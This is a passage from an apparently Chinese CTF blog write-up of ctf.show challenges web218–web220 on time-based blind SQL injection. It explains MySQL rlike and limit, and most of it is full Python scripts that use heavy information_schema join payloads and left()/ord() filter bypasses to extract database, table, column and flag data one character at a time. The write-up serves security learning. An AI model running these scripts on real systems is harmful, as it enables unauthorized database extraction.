function_">brute_force3</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;if(substr((select group_concat(<span class="subst">&#123;column&#125;</span>) from <span class="subst">&#123;table&#125;</span> ),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,(select count(*) from information_schema.columns A, information_schema.columns B),0)&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;ip&#x27;</span>: payload, <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">1.5</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,flag为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 指定的URL</span></span><br><span class="line">    url = <span class="string">&#x27;http://b817b2f0-0ddc-4315-9ea8-a08833bc417a.challenge.ctf.show/api/index.php&#x27;</span></span><br><span class="line">    database=brute_force(url)</span><br><span class="line">    brute_force1(url)</span><br><span class="line">    table=<span class="built_in">input</span>(<span class="string">&quot;请输入表名:&quot;</span>)</span><br><span class="line">    brute_force2(url)</span><br><span class="line">    column=<span class="built_in">input</span>(<span class="string">&quot;请输入列名:&quot;</span>)</span><br><span class="line">    brute_force3(url)</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250105144548883.png" alt="image-20250105144548883"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250105144800535.png" alt="image-20250105144800535"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250105145627656.png" alt="image-20250105145627656"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250105145619226.png" alt="image-20250105145619226"></p><h2 id="web219-rlike"><a href="#web219-rlike" class="headerlink" title="web219(+rlike)"></a>web219(+rlike)</h2><h3 id="补充-rlike函数"><a href="#补充-rlike函数" class="headerlink" title="补充:rlike函数"></a>补充:rlike函数</h3><h4 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h4><p>rlike是一个用于模式匹配的函数，通常在 MySQL 数据库中使用。它与 <code>LIKE</code> 类似，但提供了更强大的正则表达式支持，允许你进行更复杂的模式匹配。rlike用于检查一个字符串是否与给定的正则表达式模式匹配。如果匹配成功，则返回 <code>1</code>（真），否则返回 <code>0</code>（假）。它可以用于 <code>WHERE</code> 子句中来筛选符合条件的行。</p><h4 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">expression RLIKE <span class="keyword">pattern</span></span><br></pre></td></tr></table></figure><ul><li><code>expression</code>：要进行匹配的字符串或列。</li><li><code>pattern</code>：正则表达式的模式。</li></ul><h4 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h4><ol><li><p><strong>基本模式匹配</strong>：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table_name <span class="keyword">WHERE</span> column_name RLIKE <span class="string">&#x27;pattern&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li><p><strong>匹配以特定字符开头的字符串</strong>：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table_name <span class="keyword">WHERE</span> column_name RLIKE <span class="string">&#x27;^abc&#x27;</span>;</span><br></pre></td></tr></table></figure><p>这将返回所有以 “abc” 开头的记录。</p></li><li><p><strong>匹配包含特定字符的字符串</strong>：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table_name <span class="keyword">WHERE</span> column_name RLIKE <span class="string">&#x27;xyz&#x27;</span>;</span><br></pre></td></tr></table></figure><p>这将返回所有包含 “xyz” 的记录。</p></li><li><p><strong>匹配以特定字符结尾的字符串</strong>：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table_name <span class="keyword">WHERE</span> column_name RLIKE <span class="string">&#x27;xyz$&#x27;</span>;</span><br></pre></td></tr></table></figure><p>这将返回所有以 “xyz” 结尾的记录。</p></li><li><p><strong>匹配多个条件</strong>：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table_name <span class="keyword">WHERE</span> column_name RLIKE <span class="string">&#x27;abc|def&#x27;</span>;</span><br></pre></td></tr></table></figure><p>这将返回所有包含 “abc” 或 “def” 的记录。</p></li><li><p><strong>匹配数字</strong>：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table_name <span class="keyword">WHERE</span> column_name RLIKE <span class="string">&#x27;[0-9]&#x27;</span>;</span><br></pre></td></tr></table></figure><p>这将返回所有包含数字的记录。</p></li><li><p><strong>忽略大小写</strong>： 正则表达式本身不区分大小写，但如果需要确保忽略大小写，可以在模式中使用 <code>(?i)</code> 标志：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table_name <span class="keyword">WHERE</span> column_name RLIKE <span class="string">&#x27;(?i)pattern&#x27;</span>;</span><br></pre></td></tr></table></figure></li></ol><hr><h3 id="注入过程-5"><a href="#注入过程-5" class="headerlink" title="注入过程"></a>注入过程</h3><p>禁用了rlike()函数，但是经过测试上题的笛卡儿积方法也能用，沿用上题脚本(上题估计可以通过rlike正则匹配数据来造成时间差异)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#需要手动输入表名，列名，该脚本的响应时间发生改变，经过测试差不多将数据换为四个索引列表(information_schema.statistics)互相连接后，大于5秒合适，应该根据网速合理更改数据和响应时间(当然，也可能沾点玄学，毕竟相同的数据第一次出不了，第二次出了)</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;if(substr(database(),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,(select count(*) from information_schema.statistics A, information_schema.statistics B,information_schema.statistics C,information_schema.statistics D),0)&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;ip&#x27;</span>: payload, <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">5</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,库名为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> find</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force1</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;if(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;<span class="subst">&#123;database&#125;</span>&#x27;),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,(select count(*) from information_schema.statistics A, information_schema.statistics B,information_schema.statistics C,information_schema.statistics D),0)&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;ip&#x27;</span>: payload, <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">5</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,表名为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force2</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;<span class="subst">&#123;table&#125;</span>&#x27; ),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,(select count(*) from information_schema.statistics A, information_schema.statistics B,information_schema.statistics C,information_schema.statistics D),0)&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;ip&#x27;</span>: payload, <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">5</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,列名为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force3</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;if(substr((select group_concat(<span class="subst">&#123;column&#125;</span>) from <span class="subst">&#123;table&#125;</span> ),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,(select count(*) from information_schema.statistics A, information_schema.statistics B,information_schema.statistics C,information_schema.statistics D),0)&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;ip&#x27;</span>: payload, <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">5</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,flag为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 指定的URL</span></span><br><span class="line">    url = <span class="string">&#x27;http://04eddeb2-c30c-43b7-9e76-0fc69d9982b8.challenge.ctf.show/api/index.php&#x27;</span></span><br><span class="line">    database=brute_force(url)</span><br><span class="line">    brute_force1(url)</span><br><span class="line">    table=<span class="built_in">input</span>(<span class="string">&quot;请输入表名:&quot;</span>)</span><br><span class="line">    brute_force2(url)</span><br><span class="line">    column=<span class="built_in">input</span>(<span class="string">&quot;请输入列名:&quot;</span>)</span><br><span class="line">    brute_force3(url)</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250106161621885.png" alt="image-20250106161621885"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250106161631127.png" alt="image-20250106161631127"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250106161745852.png" alt="image-20250106161745852"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250106170328590.png" alt="image-20250106170328590"></p><h2 id="web220-substr-ascii-concat"><a href="#web220-substr-ascii-concat" class="headerlink" title="web220(+substr+ascii+concat)"></a>web220(+substr+ascii+concat)</h2><h3 id="补充-limit-函数"><a href="#补充-limit-函数" class="headerlink" title="补充:limit()函数"></a>补充:limit()函数</h3><h4 id="作用-3"><a href="#作用-3" class="headerlink" title="作用"></a>作用</h4><p>用于限制查询结果返回的行数。</p><h4 id="语法-4"><a href="#语法-4" class="headerlink" title="语法"></a>语法</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column1, column2, ...</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line">LIMIT <span class="keyword">offset</span>, count;</span><br></pre></td></tr></table></figure><ul><li><code>offset</code>: 起始位置（可选），从0开始计数。</li><li><code>count</code>: 返回的最大行数。</li></ul><h4 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 返回前5行</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employees LIMIT <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 返回从第6行开始的5行（即第7行到第11行）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employees LIMIT <span class="number">5</span> <span class="keyword">OFFSET</span> <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 等价于上面的写法</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> employees LIMIT <span class="number">5</span>, <span class="number">5</span>;</span><br></pre></td></tr></table></figure><hr><h3 id="注入过程-6"><a href="#注入过程-6" class="headerlink" title="注入过程"></a>注入过程</h3><p>把substr(),ascii()和group_concat()都过滤了，可参考布尔盲注的web191,web193，使用left(),ord()和limit()绕过,构造payload如下</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">debug<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>ip<span class="operator">=</span>if(ord(<span class="keyword">left</span>(database(),<span class="number">1</span>)<span class="operator">=</span><span class="number">99</span>),(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.statistics A, information_schema.statistics B,information_schema.statistics C,information_schema.statistics D),<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250106171329723.png" alt="image-20250106171329723"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250106171924360.png" alt="image-20250106171924360"></p><p>测试成功(图一)(现在才发现我为啥一直用的ascii()测试,明明可以直接测试是否为c的，如图二)，更改脚本盲注</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#需要手动输入表名，列名，该脚本使用limit时每次只能出一个参数，所以爆表名用0,1；爆列名用1,1；问为社么，那就是前面时间盲注的经验</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">str</span>=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;if(left(database(),<span class="subst">&#123;i&#125;</span>)=&#x27;<span class="subst">&#123;<span class="built_in">str</span>+char&#125;</span>&#x27;,(select count(*) from information_schema.statistics A, information_schema.statistics B,information_schema.statistics C,information_schema.statistics D),0)&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;ip&#x27;</span>: payload, <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">5</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">str</span> += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,库名为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> find</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force1</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">str</span>=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;if(left((select table_name from information_schema.tables where table_schema=&#x27;<span class="subst">&#123;database&#125;</span>&#x27; limit 0,1),<span class="subst">&#123;i&#125;</span>)=&#x27;<span class="subst">&#123;<span class="built_in">str</span>+char&#125;</span>&#x27;,(select count(*) from information_schema.statistics A, information_schema.statistics B,information_schema.statistics C,information_schema.statistics D),0)&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;ip&#x27;</span>: payload, <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">5</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">str</span> += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,表名为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force2</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">str</span>=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;if(left((select column_name from information_schema.columns where table_name=&#x27;<span class="subst">&#123;table&#125;</span>&#x27; limit 1,1),<span class="subst">&#123;i&#125;</span>)=&#x27;<span class="subst">&#123;<span class="built_in">str</span>+char&#125;</span>&#x27;,(select count(*) from information_schema.statistics A, information_schema.statistics B,information_schema.statistics C,information_schema.statistics D),0)&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;ip&#x27;</span>: payload, <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">5</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">str</span> += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,列名为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force3</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">str</span>=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;if(left((select <span class="subst">&#123;column&#125;</span> from <span class="subst">&#123;table&#125;</span> ),<span class="subst">&#123;i&#125;</span>)=&#x27;<span class="subst">&#123;<span class="built_in">str</span>+char&#125;</span>&#x27;,(select count(*) from information_schema.statistics A, information_schema.statistics B,information_schema.statistics C,information_schema.statistics D),0)&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;ip&#x27;</span>: payload, <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">5</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">str</span> += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,flag为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 指定的URL</span></span><br><span class="line">    url = <span class="string">&#x27;http://52d2b635-887b-41db-9096-bee49f658ddf.challenge.ctf.show/api/index.php&#x27;</span></span><br><span class="line">    database=brute_force(url)</span><br><span class="line">    brute_force1(url)</span><br><span class="line">    table=<span class="built_in">input</span>(<span class="string">&quot;请输入表名:&quot;</span>)</span><br><span class="line">    brute_force2(url)</span><br><span class="line">    column=<span class="built_in">input</span>(<span class="string">&quot;请输入列名:&quot;</span>)</span><br><span class="line">    brute_force3(url)</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250106180858655.png" alt="image-20250106180858655"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250106180907308.png" alt="image-20250106180907308"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250106180915737.png" alt="image-20250106180915737"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250106182008298.png" alt="image-20250106182008298"></p><p>到这里时间盲注就告一段落了，下面就是其他注入了</p><hr><h1 id="其他注入"><a href="#其他注入" class="headerlink" title="其他注入"></a>其他注入</h1><h2 id="web221-limit注入"><a href="#web221-limit注入" class="headerlink" title="web221(limit注入)"></a>web221(limit注入)</h2><p>测试发现通过GET方式向&#x2F;api提交变量，可通过报错注入获取库名</p><p><img 